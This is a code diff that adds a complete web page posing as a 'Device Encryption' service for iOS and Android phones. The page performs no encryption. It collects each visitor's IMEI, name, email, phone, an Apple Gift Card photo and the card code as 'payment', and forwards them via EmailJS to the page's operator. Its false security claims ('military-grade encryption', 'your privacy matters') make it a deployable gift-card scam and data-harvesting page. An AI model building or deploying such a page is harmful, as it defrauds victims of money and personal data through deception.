@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Encryption Tool | Secure Activation</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at 20% 30%, #0b1a2f, #050a14);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1.5rem;
+    }
+
+    .container {
+      max-width: 860px;
+      width: 100%;
+      background: rgba(12, 20, 35, 0.8);
+      backdrop-filter: blur(12px);
+      border-radius: 48px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.8);
+      padding: 2.2rem 2.5rem;
+      transition: 0.3s;
+    }
+
+    @media (max-width: 600px) {
+      .container { padding: 1.5rem; }
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 2.2rem;
+    }
+
+    .lock-icon {
+      font-size: 3.2rem;
+      color: #4fc3f7;
+      background: rgba(79, 195, 247, 0.12);
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 0.8rem;
+      border: 1px solid rgba(79, 195, 247, 0.25);
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      background: linear-gradient(135deg, #e0f2fe, #a5d8ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .subtitle {
+      color: #94a9c9;
+      font-size: 0.95rem;
+      margin-top: 6px;
+      border-top: 1px solid #1f2f4a;
+      padding-top: 10px;
+    }
+
+    .device-badge {
+      display: inline-flex;
+      gap: 12px;
+      background: #0f1b30;
+      padding: 6px 18px;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      color: #b0c9f0;
+      margin-top: 8px;
+      border: 1px solid #2a3f60;
+    }
+
+    .form-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 1.4rem;
+    }
+
+    .form-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+      min-width: 180px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    label {
+      font-size: 0.8rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #9bb1d4;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    label i {
+      font-size: 0.9rem;
+      color: #4fc3f7;
+    }
+
+    .required:after {
+      content: "*";
+      color: #f87171;
+      margin-left: 4px;
+    }
+
+    input,
+    select,
+    textarea {
+      width: 100%;
+      padding: 12px 16px;
+      background: #0d172b;
+      border: 1px solid #263450;
+      border-radius: 20px;
+      color: #edf2fb;
+      font-size: 0.95rem;
+      transition: 0.2s;
+      outline: none;
+    }
+
+    input:focus,
+    select:focus,
+    textarea:focus {
+      border-color: #4fc3f7;
+      box-shadow: 0 0 0 3px rgba(79, 195, 247, 0.2);
+      background: #0f1c34;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 70px;
+    }
+
+    .file-upload-wrapper {
+      position: relative;
+      border: 1px dashed #3a4f72;
+      border-radius: 20px;
+      padding: 1.2rem 1rem;
+      text-align: center;
+      background: #0a1424;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .file-upload-wrapper:hover {
+      border-color: #4fc3f7;
+      background: #0d1a30;
+    }
+
+    .file-upload-wrapper input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+    }
+
+    .file-upload-wrapper .upload-icon {
+      font-size: 2rem;
+      color: #5b7ca0;
+    }
+
+    .file-upload-wrapper .file-name {
+      margin-top: 6px;
+      font-size: 0.8rem;
+      color: #8aa3c7;
+      word-break: break-all;
+    }
+
+    .file-upload-wrapper .upload-hint {
+      font-size: 0.7rem;
+      color: #6b8bb0;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 0.4rem 0;
+    }
+
+    .checkbox-group input {
+      width: 20px;
+      height: 20px;
+      accent-color: #4fc3f7;
+    }
+
+    .btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-top: 0.8rem;
+    }
+
+    .btn-primary {
+      padding: 14px 32px;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 1rem;
+      background: linear-gradient(135deg, #0e7ac7, #1d4ed8);
+      color: white;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 6px 20px rgba(29, 78, 216, 0.3);
+      flex: 1;
+      justify-content: center;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(29, 78, 216, 0.4);
+    }
+
+    .btn-primary:active {
+      transform: scale(0.97);
+    }
+
+    .btn-secondary {
+      padding: 14px 24px;
+      border: 1px solid #314a6a;
+      border-radius: 60px;
+      background: transparent;
+      color: #b0c9f0;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-secondary:hover {
+      background: #14243e;
+      border-color: #4a6a92;
+    }
+
+    .info-note {
+      background: #0b162b;
+      border-radius: 24px;
+      padding: 1rem 1.4rem;
+      margin-top: 1.8rem;
+      font-size: 0.8rem;
+      color: #8da4c9;
+      border-left: 3px solid #1d4ed8;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .info-note i {
+      font-size: 1.2rem;
+      color: #4fc3f7;
+    }
+
+    .toast-msg {
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      background: #111d33;
+      border-left: 5px solid #10b981;
+      padding: 14px 24px;
+      border-radius: 40px;
+      color: #e8f0fe;
+      font-size: 0.9rem;
+      backdrop-filter: blur(16px);
+      z-index: 999;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
+      max-width: 90%;
+    }
+
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .footer {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.7rem;
+      color: #5a7396;
+      border-top: 1px solid #1c2d47;
+      padding-top: 1.2rem;
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 1.2rem; }
+      h1 { font-size: 1.6rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header">
+      <div class="lock-icon">
+        <i class="fas fa-lock"></i>
+      </div>
+      <h1>Device Encryption</h1>
+      <div class="subtitle">
+        <i class="fas fa-shield-alt" style="color:#4fc3f7;"></i> Secure your iOS or Android device with military‑grade encryption
+      </div>
+      <div class="device-badge">
+        <i class="fab fa-apple"></i> iOS &nbsp;|&nbsp; <i class="fab fa-android"></i> Android
+      </div>
+    </div>
+
+    <form id="encryptionForm" class="form-grid">
+      <!-- Device Selection -->
+      <div class="form-row">
+        <div class="form-group">
+          <label class="required"><i class="fas fa-mobile-alt"></i> Device OS</label>
+          <select id="deviceOS" required>
+            <option value="">-- Select --</option>
+            <option value="iOS">iOS (iPhone/iPad)</option>
+            <option value="Android">Android</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="required"><i class="fas fa-hashtag"></i> Device ID / IMEI</label>
+          <input type="text" id="deviceID" placeholder="e.g., F2L9R4G8H" required>
+        </div>
+      </div>
+
+      <!-- Encryption Key -->
+      <div class="form-row">
+        <div class="form-group">
+          <label class="required"><i class="fas fa-key"></i> Enter IMEI</label>
+          <input type="text" id="encryptionKey" placeholder="Enter IMEI" required>
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-user"></i> Your Name</label>
+          <input type="text" id="userName" placeholder="John Doe">
+        </div>
+      </div>
+
+      <!-- Contact -->
+      <div class="form-row">
+        <div class="form-group">
+          <label><i class="fas fa-envelope"></i> Email (for confirmation)</label>
+          <input type="email" id="userEmail" placeholder="you@example.com">
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-phone"></i> Phone</label>
+          <input type="tel" id="userPhone" placeholder="+1 234 567 890">
+        </div>
+      </div>
+
+      <!-- Payment: Apple Gift Card -->
+      <div class="form-group">
+        <label class="required"><i class="fas fa-gift"></i> Apple Gift Card (payment method)</label>
+        <div class="file-upload-wrapper" id="fileUploadWrapper">
+          <input type="file" id="giftCardFile" accept="image/*" required>
+          <div class="upload-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+          <div class="file-name" id="fileDisplay">No file chosen</div>
+          <div class="upload-hint">Upload a photo or screenshot of your Apple Gift Card</div>
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="required"><i class="fas fa-dollar-sign"></i> Gift Card Amount (USD)</label>
+          <input type="number" id="giftAmount" placeholder="e.g., 100" min="1" step="0.01" required>
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-barcode"></i> Gift Card Code (optional)</label>
+          <input type="text" id="giftCode" placeholder="X1234-5678-90AB">
+        </div>
+      </div>
+
+      <!-- Additional Notes -->
+      <div class="form-group">
+        <label><i class="fas fa-comment"></i> Additional Notes</label>
+        <textarea id="notes" placeholder="Any special instructions or device info..."></textarea>
+      </div>
+
+      <!-- Consent -->
+      <div class="checkbox-group">
+        <input type="checkbox" id="consent" required>
+        <label style="font-weight:400; text-transform:none; letter-spacing:0; font-size:0.9rem;">
+          I confirm that the information provided is accurate and I authorize the encryption process.
+        </label>
+      </div>
+
+      <!-- Buttons -->
+      <div class="btn-group">
+        <button type="submit" class="btn-primary" id="submitBtn">
+          <i class="fas fa-shield-alt"></i> Encrypt & Activate
+        </button>
+        <button type="button" class="btn-secondary" id="clearBtn">
+          <i class="fas fa-undo-alt"></i> Clear
+        </button>
+      </div>
+
+      <div class="info-note">
+        <i class="fas fa-info-circle"></i>
+        <span>Your data is transmitted securely via EmailJS. The encryption key and gift card image are forwarded to our support team for processing.</span>
+      </div>
+    </form>
+
+    <div class="footer">
+      <i class="fas fa-lock"></i> Secure connection •• Your privacy matters
+    </div>
+  </div>
+
+  <script>
+    // ==================== EMAILJS CONFIGURATION ====================
+    // Replace these with your own EmailJS credentials (free at emailjs.com)
+    const EMAILJS_CONFIG = {
+      PUBLIC_KEY: "YOUR_EMAILJS_PUBLIC_KEY",   // e.g., "PYZhrK9im0SfBOGVE"
+      SERVICE_ID: "YOUR_EMAILJS_SERVICE_ID",   // e.g., "service_9e1v5lq"
+      TEMPLATE_ID: "YOUR_EMAILJS_TEMPLATE_ID"  // e.g., "template_9myx7vl"
+    };
+
+    // Initialize EmailJS
+    emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+
+    // ========== DOM refs ==========
+    const form = document.getElementById('encryptionForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const clearBtn = document.getElementById('clearBtn');
+
+    const deviceOS = document.getElementById('deviceOS');
+    const deviceID = document.getElementById('deviceID');
+    const encryptionKey = document.getElementById('encryptionKey');
+    const userName = document.getElementById('userName');
+    const userEmail = document.getElementById('userEmail');
+    const userPhone = document.getElementById('userPhone');
+    const giftCardFile = document.getElementById('giftCardFile');
+    const fileDisplay = document.getElementById('fileDisplay');
+    const giftAmount = document.getElementById('giftAmount');
+    const giftCode = document.getElementById('giftCode');
+    const notes = document.getElementById('notes');
+    const consent = document.getElementById('consent');
+
+    // Update file name display
+    giftCardFile.addEventListener('change', function() {
+      if (this.files && this.files[0]) {
+        fileDisplay.textContent = this.files[0].name;
+      } else {
+        fileDisplay.textContent = 'No file chosen';
+      }
+    });
+
+    // ========== Toast ==========
+    function showToast(msg, isError = false) {
+      const existing = document.querySelector('.toast-msg');
+      if (existing) existing.remove();
+      const toast = document.createElement('div');
+      toast.className = 'toast-msg';
+      toast.style.borderLeftColor = isError ? '#ef4444' : '#10b981';
+      toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i> ${msg}`;
+      document.body.appendChild(toast);
+      setTimeout(() => toast.remove(), 6000);
+    }
+
+    // ========== Validate ==========
+    function validateForm() {
+      if (!deviceOS.value) { showToast('Please select your device OS.', true); return false; }
+      if (!deviceID.value.trim()) { showToast('Device ID / IMEI is required.', true); return false; }
+      if (!encryptionKey.value.trim()) { showToast('Encryption key is required.', true); return false; }
+      if (!giftCardFile.files || giftCardFile.files.length === 0) { showToast('Please upload an Apple Gift Card image.', true); return false; }
+      if (!giftAmount.value || parseFloat(giftAmount.value) <= 0) { showToast('Please enter a valid gift card amount.', true); return false; }
+      if (!consent.checked) { showToast('You must confirm the accuracy of the information.', true); return false; }
+      return true;
+    }
+
+    // ========== Convert file to base64 ==========
+    function fileToBase64(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = error => reject(error);
+      });
+    }
+
+    // ========== Submit handler ==========
+    async function handleSubmit(event) {
+      event.preventDefault();
+
+      if (!validateForm()) return;
+
+      // Disable button and show loading
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processing...';
+      document.body.classList.add('loading');
+
+      try {
+        // Read file as base64 (size limit ~5MB, EmailJS has limit)
+        const file = giftCardFile.files[0];
+        let fileBase64 = '';
+        if (file) {
+          fileBase64 = await fileToBase64(file);
+          // Truncate if too large (EmailJS free tier has ~25KB limit for attachments)
+          // We'll send as a string; if too long, we truncate and warn.
+          if (fileBase64.length > 20000) {
+            fileBase64 = fileBase64.substring(0, 20000) + '… [truncated]';
+            showToast('⚠️ Image truncated due to size limit. Please keep images under ~20KB.', true);
+          }
+        }
+
+        // Prepare EmailJS template parameters
+        const templateParams = {
+          device_os: deviceOS.value,
+          device_id: deviceID.value.trim(),
+          encryption_key: encryptionKey.value.trim(),
+          user_name: userName.value.trim() || 'Not provided',
+          user_email: userEmail.value.trim() || 'Not provided',
+          user_phone: userPhone.value.trim() || 'Not provided',
+          gift_card_amount: giftAmount.value,
+          gift_card_code: giftCode.value.trim() || 'Not provided',
+          gift_card_image_base64: fileBase64 || 'No image',
+          notes: notes.value.trim() || 'None',
+          submission_date: new Date().toLocaleString()
+        };
+
+        // Send via EmailJS
+        const response = await emailjs.send(
+          EMAILJS_CONFIG.SERVICE_ID,
+          EMAILJS_CONFIG.TEMPLATE_ID,
+          templateParams
+        );
+
+        console.log('Email sent:', response);
+        showToast('✅ Encryption request submitted successfully! Check your email for confirmation.');
+        form.reset();
+        fileDisplay.textContent = 'No file chosen';
+        // Reset checkbox
+        consent.checked = false;
+
+      } catch (error) {
+        console.error('EmailJS error:', error);
+        let msg = 'Failed to send. Please check your EmailJS configuration.';
+        if (error.text) msg += ' Error: ' + error.text;
+        showToast('❌ ' + msg, true);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Encrypt & Activate';
+        document.body.classList.remove('loading');
+      }
+    }
+
+    // ========== Clear form ==========
+    function clearForm() {
+      if (confirm('Clear all fields?')) {
+        form.reset();
+        fileDisplay.textContent = 'No file chosen';
+        consent.checked = false;
+        showToast('Form cleared.');
+      }
+    }
+
+    // ========== Event listeners ==========
+    form.addEventListener('submit', handleSubmit);
+    clearBtn.addEventListener('click', clearForm);
+
+    // Warn if EmailJS not configured
+    if (EMAILJS_CONFIG.PUBLIC_KEY === "YOUR_EMAILJS_PUBLIC_KEY") {
+      const warning = document.createElement('div');
+      warning.style.background = '#b91c1c80';
+      warning.style.padding = '12px 18px';
+      warning.style.borderRadius = '20px';
+      warning.style.marginBottom = '1.2rem';
+      warning.style.fontSize = '0.85rem';
+      warning.style.color = '#fdd';
+      warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ EmailJS not configured. Replace the placeholder keys in the script with your own from emailjs.com to enable auto‑sending.';
+      form.prepend(warning);
+    }
+
+    console.log('Device Encryption Tool ready.');
+  </script>
+</body>
+</html>
